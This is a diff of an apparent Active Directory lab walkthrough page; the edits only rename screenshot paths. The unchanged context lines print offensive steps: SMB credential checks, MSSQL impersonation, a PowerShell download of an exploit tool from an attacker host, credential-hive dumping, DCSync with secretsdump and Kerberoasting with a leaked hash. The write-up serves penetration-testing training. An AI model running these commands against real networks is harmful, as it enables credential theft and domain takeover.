@@ -123,7 +123,7 @@ To check if a user can access any systems I prefer to use [CrackMapExec](https:/
 crackmapexec smb 10.0.0.0/24 -u richard -p Sample123
 ```
 
-![](<../../../.gitbook/assets/image (56) (1).png>)
+![](<../../../.gitbook/assets/image (56) (1) (1).png>)
 
 The account can access three hosts over SMB but unfortunately we aren't local admin to any of them. We can still check for any accessible SMB shares by adding the `--shares` parameter.
 
@@ -205,7 +205,7 @@ use master;
 EXECUTE AS LOGIN = 'Developer'
 ```
 
-![](<../../../.gitbook/assets/image (39) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (39) (1) (1) (1) (1).png>)
 
 Seems like it worked, lets run the query again to check which user we are and if we are sysadmin:
 
@@ -214,7 +214,7 @@ SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
 ```
 
-![](<../../../.gitbook/assets/image (18) (1) (1).png>)
+![](<../../../.gitbook/assets/image (18) (1) (1) (1).png>)
 
 4\. We impersonated the user `Developer` but still aren't sysadmin. We can check for impersonation permissions again with the same query:
 
@@ -525,7 +525,7 @@ SELECT * FROM OPENQUERY("DATA01.SECURE.LOCAL", 'select @@version');
 SELECT * FROM OPENQUERY("DATA01.SECURE.LOCAL", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');
 ```
 
-![](<../../../.gitbook/assets/image (56).png>)
+![](<../../../.gitbook/assets/image (56) (1).png>)
 
 Unfortunately it isn't enabled.&#x20;
 
@@ -654,7 +654,7 @@ Set-DomainObjectOwner -Domain secure.local -Credential $creds -Server 10.0.0.100
 
 We didn't received any output, but we can execute the commands again to see who the owner is now.
 
-![](<../../../.gitbook/assets/image (19) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (19) (1) (1) (1) (1).png>)
 
 The owner successfully changed.
 
@@ -889,7 +889,7 @@ mkdir ~/adlab/share
 python3 /opt/impacket/examples/smbserver.py share ~/adlab/share -smb2support
 ```
 
-![](<../../../.gitbook/assets/image (27) (1).png>)
+![](<../../../.gitbook/assets/image (27) (1) (1).png>)
 
 3\. The next step is to execute the BackupOperatorToDa tool to retrieve the the SAM, SYSTEN and SECURITY HIVE and save them in our created public share. But first we have to download it on `DATA01` in the shell:
 
@@ -909,7 +909,7 @@ $WebClient.DownloadFile("http://192.168.248.2:8090/BackupOperatorToDA.exe","C:\u
 secretsdump.py LOCAL -system ~/adlab/share/SYSTEM -security ~/adlab/share/SECURITY -sam ~/adlab/share/SAM
 ```
 
-![](<../../../.gitbook/assets/image (18) (1).png>)
+![](<../../../.gitbook/assets/image (18) (1) (1).png>)
 
 6\. The last step is to run Secretsdump.py to run DCsync and retrieve all the domain account hashes using the computeraccount:
 
@@ -933,7 +933,7 @@ secretsdump.py 'secure.local/dc03$'@dc03.secure.local -hashes aad3b435b51404eeaa
 python3 /opt/impacket/examples/GetUserSPNs.py 'secure.local/Administrator' -dc-ip 10.0.0.2 -target-domain bank.local -hashes :a59cc2e81b2835c6b402634e584a8edc -outputfile kerberoast.txt
 ```
 
-![](<../../../.gitbook/assets/image (18).png>)
+![](<../../../.gitbook/assets/image (18) (1).png>)
 
 2\. We retrieved one hash. Lets crack it with Hashcat.
 
